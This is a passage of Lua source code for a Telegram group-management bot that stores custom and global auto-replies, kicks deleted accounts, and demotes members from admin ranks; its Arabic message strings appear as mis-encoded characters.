database:set(bot_id.."Text:Manager"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:del(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_) 
database:del(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
database:sadd(bot_id.."List:Manager"..msg.chat_id_.."", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_.."") == "true2" then
send(msg.chat_id_, msg.id_,"*Ω­ΨͺΩ Ψ§Ψ²Ψ§ΩΨ© Ψ§ΩΨ±Ψ― ΩΩ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨ±Ψ―ΩΨ―*")
database:del(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_) 
database:del(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
database:del(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."List:Manager"..msg.chat_id_.."", text)
return false
end
end
if text and not database:get(bot_id.."Reply:Manager"..msg.chat_id_) then
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
local anemi = database:get(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
local veico = database:get(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
local stekr = database:get(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_) 
local Text = database:get(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
local photo = database:get(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
local video = database:get(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
local document = database:get(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
local audio = database:get(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
if Text then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,data)
local Msguser = database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local rtp = Get_Rank(msg.sender_user_id_,msg.chat_id_)
local edit = database:get(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0
local Text = Text:gsub('#username',(data.username_ or 'ΩΨ§ ΩΩΨ¬Ψ―')) 
local Text = Text:gsub('#name',data.first_name_)
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit)
local Text = Text:gsub('#msgs',Msguser)
local Text = Text:gsub('#stast',rtp)
send(msg.chat_id_, msg.id_,'['..Text..']')
database:sadd(bot_id.."Spam:Texting"..msg.sender_user_id_,text) 
end,nil)
end
if stekr then 
sendSticker(msg.chat_id_, msg.id_, 0, 1, nil, stekr)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if veico then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, veico)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if video then 
sendVideo(msg.chat_id_, msg.id_, 0, 1, nil,video)
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if anemi then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, anemi, '', nil)  
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if document then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, document)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
if audio then
sendAudio(msg.chat_id_,msg.id_,audio)  
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if photo then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil,photo,'')
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
end
end
------------------------------------------------------------------------
if text == ("ΩΨ³Ψ­ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ") and DevSonic(msg) then 
local list = database:smembers(bot_id.."List:Rd:Sudo")
for k,v in pairs(list) do
database:del(bot_id.."Add:Rd:Sudo:Gif"..v) 
database:del(bot_id.."Add:Rd:Sudo:vico"..v) 
database:del(bot_id.."Add:Rd:Sudo:stekr"..v) 
database:del(bot_id.."Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."Add:Rd:Sudo:Photo"..v)
database:del(bot_id.."Add:Rd:Sudo:Video"..v)
database:del(bot_id.."Add:Rd:Sudo:File"..v)
database:del(bot_id.."Add:Rd:Sudo:Audio"..v)
database:del(bot_id.."List:Rd:Sudo")
end
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ")
end
if text == ("Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ") and DevSonic(msg) then 
local list = database:smembers(bot_id.."List:Rd:Sudo")
text = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ \nβ β β β β β β β β\n"
for k,v in pairs(list) do
if database:get(bot_id.."Add:Rd:Sudo:Gif"..v) then
db = "ΩΨͺΨ­Ψ±ΩΩ Ω­"
elseif database:get(bot_id.."Add:Rd:Sudo:vico"..v) then
db = "Ω­ Ψ¨Ψ΅ΩΩ"
elseif database:get(bot_id.."Add:Rd:Sudo:stekr"..v) then
db = "Ω­ ΩΩΨ΅Ω"
elseif database:get(bot_id.."Add:Rd:Sudo:Text"..v) then
db = "Ω­ Ψ±Ψ³Ψ§ΩΩ"
elseif database:get(bot_id.."Add:Rd:Sudo:Photo"..v) then
db = "Ω­ Ψ΅ΩΨ±Ω"
elseif database:get(bot_id.."Add:Rd:Sudo:Video"..v) then
db = "Ω­ ΩΩΨ―ΩΩ"
elseif database:get(bot_id.."Add:Rd:Sudo:File"..v) then
db = "Ω­ ΩΩΩ"
elseif database:get(bot_id.."Add:Rd:Sudo:Audio"..v) then
db = "Ω­ Ψ§ΨΊΩΩΩ"
end
text = text..""..k.." >> ("..v..") Β» {"..db.."}\n"
end
if #list == 0 then
text = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ±Ψ―ΩΨ― ΩΩΩΨ·ΩΨ±"
end
send(msg.chat_id_, msg.id_,"["..text.."]")
end
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then 
local test = database:get(bot_id.."Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:del(bot_id.."Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_)
if msg.content_.sticker_ then 
database:set(bot_id.."Add:Rd:Sudo:stekr"..test, msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then 
database:set(bot_id.."Add:Rd:Sudo:vico"..test, msg.content_.voice_.voice_.persistent_id_) 
end 
if msg.content_.animation_ then 
database:set(bot_id.."Add:Rd:Sudo:Gif"..test, msg.content_.animation_.animation_.persistent_id_) 
end 
if text then 
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."Add:Rd:Sudo:Text"..test, text) 
end 
if msg.content_.audio_ then
database:set(bot_id.."Add:Rd:Sudo:Audio"..test, msg.content_.audio_.audio_.persistent_id_) 
end
if msg.content_.document_ then
database:set(bot_id.."Add:Rd:Sudo:File"..test, msg.content_.document_.document_.persistent_id_) 
end
if msg.content_.video_ then
database:set(bot_id.."Add:Rd:Sudo:Video"..test, msg.content_.video_.video_.persistent_id_) 
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
database:set(bot_id.."Add:Rd:Sudo:Photo"..test, photo_in_group) 
end
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ­ΩΨΈ Ψ§ΩΨ±Ψ― Ψ¨ΩΨ¬Ψ§Ψ­")
return false 
end 
end

if text == "Ψ§ΨΆΩ Ψ±Ψ― ΨΉΨ§Ω" and DevSonic(msg) then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§Ψ±Ψ³Ω Ψ§ΩΩΩΩΩ Ψ§ΩΨͺΨ±Ω ΨͺΨ±ΩΨ― Ψ§ΨΆΨ§ΩΨͺΩΨ§")
database:set(bot_id.."Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
return false 
end
if text == "Ψ­Ψ°Ω Ψ±Ψ― ΨΉΨ§Ω" and DevSonic(msg) then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§Ψ±Ψ³Ω Ψ§ΩΩΩΩΩ Ψ§ΩΨͺΨ±Ω ΨͺΨ±ΩΨ― Ψ­Ψ°ΩΩΨ§")
database:set(bot_id.."Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return false 
end
if text == "ΩΨ³Ψ­ Ψ±Ψ― ΨΉΨ§Ω" and DevSonic(msg) then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§Ψ±Ψ³Ω Ψ§ΩΩΩΩΩ Ψ§ΩΨͺΨ±Ω ΨͺΨ±ΩΨ― Ψ­Ψ°ΩΩΨ§")
database:set(bot_id.."Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return false 
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, 'Ω­ Ψ§ΩΨ§Ω Ψ§Ψ±Ψ³Ω Ψ§ΩΨ±Ψ― Ψ§ΩΨ°Ω ΨͺΨ±ΩΨ― Ψ§ΨΆΨ§ΩΨͺΩ \nΩ­ ΩΨ― ΩΩΩΩ (ΩΩΩ - ΩΨ―ΩΩ - ΩΨ΅ - ΩΩΨ΅Ω - Ψ¨Ψ΅ΩΩ - ΩΨͺΨ­Ψ±ΩΩ )\nΩ­ ΩΩΩΩΩ Ψ§ΨΆΨ§ΩΩ Ψ§ΩΩ Ψ§ΩΩΨ΅ :\n- `#username` > Ψ§Ψ³Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n- `#msgs` > ΨΉΨ―Ψ― Ψ±Ψ³Ψ§Ψ¦Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n- `#name` > Ψ§Ψ³Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n- `#id` > Ψ§ΩΨ―Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n- `#stast` > ΩΩΩΨΉ Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω \n- `#edit` > ΨΉΨ―Ψ― Ψ§ΩΨͺΨΉΨ―ΩΩΨ§Ψͺ ')
database:set(bot_id.."Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ§Ψ²Ψ§ΩΨ© Ψ§ΩΨ±Ψ― ΩΩ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ")
list = {"Add:Rd:Sudo:Audio","Add:Rd:Sudo:File","Add:Rd:Sudo:Video","Add:Rd:Sudo:Photo","Add:Rd:Sudo:Text","Add:Rd:Sudo:stekr","Add:Rd:Sudo:vico","Add:Rd:Sudo:Gif"}
for k,v in pairs(list) do
database:del(bot_id..''..v..text)
end
database:del(bot_id.."Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."List:Rd:Sudo", text)
return false
end
end

if text and not database:get(bot_id.."Reply:Sudo"..msg.chat_id_) then
if not database:sismember(bot_id..'Spam:Group'..msg.sender_user_id_,text) then
local anemi = database:get(bot_id.."Add:Rd:Sudo:Gif"..text) 
local veico = database:get(bot_id.."Add:Rd:Sudo:vico"..text) 
local stekr = database:get(bot_id.."Add:Rd:Sudo:stekr"..text) 
local Text = database:get(bot_id.."Add:Rd:Sudo:Text"..text) 
local photo = database:get(bot_id.."Add:Rd:Sudo:Photo"..text)
local video = database:get(bot_id.."Add:Rd:Sudo:Video"..text)
local document = database:get(bot_id.."Add:Rd:Sudo:File"..text)
local audio = database:get(bot_id.."Add:Rd:Sudo:Audio"..text)

if Text then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,data)
local NumMsg = database:get(bot_id..'messageUser'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = Get_Rank(msg.sender_user_id_,msg.chat_id_)
local message_edit = database:get(bot_id..'message_edit'..msg.chat_id_..msg.sender_user_id_) or 0
local Text = Text:gsub('#username',(data.username_ or 'ΩΨ§ ΩΩΨ¬Ψ―')) 
local Text = Text:gsub('#name',data.first_name_)
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',message_edit)
local Text = Text:gsub('#msgs',NumMsg)
local Text = Text:gsub('#stast',Status_Gps)
send(msg.chat_id_, msg.id_,'['..Text..']')
database:sadd(bot_id.."Spam:Group"..msg.sender_user_id_,text) 
end,nil)
end
if stekr then 
sendSticker(msg.chat_id_,msg.id_,stekr) 
database:sadd(bot_id.."Spam:Group"..msg.sender_user_id_,text) 
end
if veico then 
sendVoice(msg.chat_id_, msg.id_,veico,"")
database:sadd(bot_id.."Spam:Group"..msg.sender_user_id_,text) 
end
if video then 
sendVideo(msg.chat_id_, msg.id_,video,"")
database:sadd(bot_id.."Spam:Group"..msg.sender_user_id_,text) 
end
if anemi then 
sendAnimation(msg.chat_id_, msg.id_,anemi,"") 
database:sadd(bot_id.."Spam:Group"..msg.sender_user_id_,text) 
end
if document then
sendDocument(msg.chat_id_, msg.id_, document) 
database:sadd(bot_id.."Spam:Group"..msg.sender_user_id_,text) 
end 
if audio then
sendAudio(msg.chat_id_,msg.id_,audio) 
database:sadd(bot_id.."Spam:Group"..msg.sender_user_id_,text) 
end
if photo then
sendPhoto(msg.chat_id_,msg.id_,photo,"")
database:sadd(bot_id.."Spam:Group"..msg.sender_user_id_,text) 
end 
end
end
if text == 'Ψ·Ψ±Ψ― Ψ§ΩΩΨ­Ψ°ΩΩΩΩ' or text == 'ΩΨ³Ψ­ Ψ§ΩΩΨ­Ψ°ΩΩΩΩ' then 
if Admin(msg) then 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),offset_ = 0,limit_ = 1000}, function(arg,del)
for k, v in pairs(del.members_) do
tdcli_function({ID = "GetUser",user_id_ = v.user_id_},function(b,data) 
if data.first_name_ == false then
Kick_Group(msg.chat_id_, data.id_)
end
end,nil)
end
send(msg.chat_id_, msg.id_,'Ω­ ΨͺΩ Ψ·Ψ±Ψ― Ψ§ΩΨ­Ψ³Ψ§Ψ¨Ψ§Ψͺ Ψ§ΩΩΨ­Ψ°ΩΩΩ')
end,nil)
end
end

if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ―ΩΨ―" and Manger(msg) then 
database:del(bot_id.."Reply:Manager"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ―ΩΨ―") 
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ―ΩΨ―" and Manger(msg) then 
database:set(bot_id.."Reply:Manager"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ―ΩΨ―" ) 
end
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ" and Manger(msg) then 
database:del(bot_id.."Reply:Sudo"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ" ) 
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ" and Manger(msg) then 
database:set(bot_id.."Reply:Sudo"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ" ) 
end
if text and text:match("^ΨͺΩΨ²ΩΩ Ψ§ΩΩΩ @(.*)$") and Manger(msg) then 
local username = text:match("^ΨͺΩΨ²ΩΩ Ψ§ΩΩΩ @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"Ω­ ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !") 
return false 
end 
if tonumber(SUDO) == tonumber(result.id_) then
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ ΨͺΩΨ²ΩΩ Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false 
end
if database:sismember(bot_id.."DEV:Sudo:T",result.id_) then 
devss = "Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΒ²" else devss = "" end
if database:sismember(bot_id.."Sudo:User",result.id_) then
dev = "Ψ§ΩΩΨ·ΩΨ± Ψ" else dev = "" end
if database:sismember(bot_id.."Vip:all",result.id_) then
vipall = "Ψ§ΩΩΩΩΨ² Ψ§ΩΨΉΨ§Ω" else vipall = "" end
if database:sismember(bot_id.."manger:all",result.id_) then
mna = "Ψ§ΩΩΨ―ΩΨ± Ψ§ΩΨΉΨ§Ω" else mna = "" end
if database:sismember(bot_id.."Basic:Creator"..msg.chat_id_, result.id_) then
crr = "ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω Ψ" else crr = "" end
if database:sismember(bot_id.."Creator"..msg.chat_id_, result.id_) then
cr = "ΩΩΨ΄Ψ¦ Ψ" else cr = "" end
if database:sismember(bot_id.."Manager"..msg.chat_id_, result.id_) then
own = "ΩΨ―ΩΨ± Ψ" else own = "" end
if database:sismember(bot_id.."Mod:User"..msg.chat_id_, result.id_) then
mod = "Ψ§Ψ―ΩΩ Ψ" else mod = "" end
if database:sismember(bot_id.."Special:User"..msg.chat_id_, result.id_) then
vip = "ΩΩΩΨ² Ψ" else vip = ""
end
if Rank_Checking(result.id_,msg.chat_id_) ~= false then
send(msg.chat_id_, msg.id_,"\nΩ­ ΨͺΩ ΨͺΩΨ²ΩΩ Ψ§ΩΨ΄Ψ?Ψ΅ ΩΩ Ψ§ΩΨ±ΨͺΨ¨ Ψ§ΩΨͺΨ§ΩΩΩ \nΩ­ { "..mna..""..vipall..""..devss..""..dev..""..crr..""..cr..""..own..""..mod..""..vip.." } \n")
else
send(msg.chat_id_, msg.id_,"\nΩ­ ΩΩΨ³ ΩΨ―ΩΩ Ψ±ΨͺΨ¨ Ψ­ΨͺΩ Ψ§Ψ³ΨͺΨ·ΩΨΉ ΨͺΩΨ²ΩΩΩ \n")
end
if tonumber(Id_Sudo) == tonumber(msg.sender_user_id_) then
database:srem(bot_id.."DEV:Sudo:T",result.id_)
database:srem(bot_id.."Vip:all", result.id_)
database:srem(bot_id.."Sudo:User", result.id_)
database:srem(bot_id.."Basic:Creator"..msg.chat_id_,result.id_)
database:srem(bot_id.."Creator"..msg.chat_id_, result.id_)
database:srem(bot_id.."Manager"..msg.chat_id_, result.id_)
database:srem(bot_id.."Mod:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Special:User"..msg.chat_id_, result.id_)
elseif database:sismember(bot_id.."Sudo:User",msg.sender_user_id_) then
database:srem(bot_id.."Mod:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Special:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Manager"..msg.chat_id_, result.id_)
database:srem(bot_id.."Creator"..msg.chat_id_, result.id_)
database:srem(bot_id.."Basic:Creator"..msg.chat_id_,result.id_)
elseif database:sismember(bot_id.."Basic:Creator"..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id.."Mod:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Special:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Manager"..msg.chat_id_, result.id_)
database:srem(bot_id.."Creator"..msg.chat_id_, result.id_)
elseif database:sismember(bot_id.."Creator"..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id.."Mod:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Special:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Manager"..msg.chat_id_, result.id_)
elseif database:sismember(bot_id.."Manager"..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id.."Mod:User"..msg.chat_id_, result.id_)
database:srem(bot_id.."Special:User"..msg.chat_id_, result.id_)
end
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
end

if text == ("ΨͺΩΨ²ΩΩ Ψ§ΩΩΩ") and msg.reply_to_message_id_ ~= 0 and Manger(msg) then
function Function_Tshake(extra, result, success)
if tonumber(SUDO) == tonumber(result.sender_user_id_) then
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ ΨͺΩΨ²ΩΩ Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false 
end
if database:sismember(bot_id.."DEV:Sudo:T",result.sender_user_id_) then 
devss = "Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΒ²" else devss = "" end
if database:sismember(bot_id.."Sudo:User",result.sender_user_id_) then
dev = "Ψ§ΩΩΨ·ΩΨ± Ψ" else dev = "" end
if database:sismember(bot_id.."manger:all",result.sender_user_id_) then
mna = "Ψ§ΩΩΨ―ΩΨ± Ψ§ΩΨΉΨ§Ω" else mna = "" end
if database:sismember(bot_id.."Vip:all",result.sender_user_id_) then
vipall = "Ψ§ΩΩΩΩΨ² Ψ§ΩΨΉΨ§Ω" else vipall = "" end
if database:sismember(bot_id.."Vip:all",result.sender_user_id_) then
vipall = "Ψ§ΩΩΨ·ΩΨ± Ψ" else vipall = "" end
if database:sismember(bot_id.."Basic:Creator"..msg.chat_id_, result.sender_user_id_) then
crr = "ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω Ψ" else crr = "" end
if database:sismember(bot_id.."Creator"..msg.chat_id_, result.sender_user_id_) then
cr = "ΩΩΨ΄Ψ¦ Ψ" else cr = "" end
if database:sismember(bot_id.."Manager"..msg.chat_id_, result.sender_user_id_) then
own = "ΩΨ―ΩΨ± Ψ" else own = "" end
if database:sismember(bot_id.."Mod:User"..msg.chat_id_, result.sender_user_id_) then
mod = "Ψ§Ψ―ΩΩ Ψ" else mod = "" end
if database:sismember(bot_id.."Special:User"..msg.chat_id_, result.sender_user_id_) then
vip = "ΩΩΩΨ² Ψ" else vip = ""
end
if Rank_Checking(result.sender_user_id_,msg.chat_id_) ~= false then
send(msg.chat_id_, msg.id_,"\nΩ­ ΨͺΩ ΨͺΩΨ²ΩΩ Ψ§ΩΨ΄Ψ?Ψ΅ ΩΩ Ψ§ΩΨ±ΨͺΨ¨ Ψ§ΩΨͺΨ§ΩΩΩ \nΩ­ { "..mna..""..vipall..""..devss..""..dev..""..crr..""..cr..""..own..""..mod..""..vip.." } \n")
else
send(msg.chat_id_, msg.id_,"\nΩ­ ΩΩΨ³ ΩΨ―ΩΩ Ψ±ΨͺΨ¨ Ψ­ΨͺΩ Ψ§Ψ³ΨͺΨ·ΩΨΉ ΨͺΩΨ²ΩΩΩ \n")
end
if tonumber(Id_Sudo) == tonumber(msg.sender_user_id_) then
database:srem(bot_id.."DEV:Sudo:T",result.sender_user_id_) 
database:srem(bot_id.."Vip:all",result.sender_user_id_) 
database:srem(bot_id.."manger:all",result.sender_user_id_) 
database:srem(bot_id.."Sudo:User", result.sender_user_id_)
database:srem(bot_id.."Basic:Creator"..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id.."Creator"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Manager"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Mod:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Special:User"..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id.."Sudo:User",msg.sender_user_id_) then
database:srem(bot_id.."Mod:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Special:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Manager"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Creator"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Basic:Creator"..msg.chat_id_,result.sender_user_id_)
elseif database:sismember(bot_id.."Basic:Creator"..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id.."Mod:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Special:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Manager"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Creator"..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id.."Creator"..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id.."Mod:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Special:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Manager"..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id.."Manager"..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id.."Mod:User"..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id.."Special:User"..msg.chat_id_, result.sender_user_id_)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
end
--------------
if text == 'ΩΨ²ΩΩΩ' or text == 'ΨͺΩΨ²ΩΩ Ψ±ΨͺΨ¨ΨͺΩ' then   
database:set(bot_id..'yesdel'..msg.sender_user_id_..'', 'delyes')
_key = {
{{text="ΨͺΨ£ΩΩΨ― Ψ§ΩΨ§ΩΨ±",callback_data="OkDelMe"..msg.sender_user_id_},{text="Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§ΩΨ±",callback_data="noKikedMe"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_," *Ω­ ΩΩ Ψ¨ΨͺΨ£ΩΩΨ― Ψ§ΩΨΉΩΩΩΩ Ψ§ΩΨ§Ω*",_key,msg.id_)
return false
end
if text == ("ΨͺΨ΅ΩΩΩ") or text == ("ΨͺΩΨ²ΩΩ Ψ¬ΩΩΨΉ Ψ§ΩΨ±ΨͺΨ¨") and msg.reply_to_message_id_ == 0 and SupCreator(msg) then
send(msg.chat_id_, msg.id_,"\nΩ­ ΨͺΩ ΨͺΩΨ²ΩΩ Ψ¬ΩΩΨΉ Ψ§ΩΨ±ΨͺΨ¨ \n")
database:del(bot_id.."Creator"..msg.chat_id_)
database:del(bot_id.."Manager"..msg.chat_id_)
database:del(bot_id.."Mod:User"..msg.chat_id_)
database:del(bot_id.."Special:User"..msg.chat_id_)
end
if text == 'Ψ§ΩΨ±ΨͺΨ¨' then
if OwnerSs(msg) then
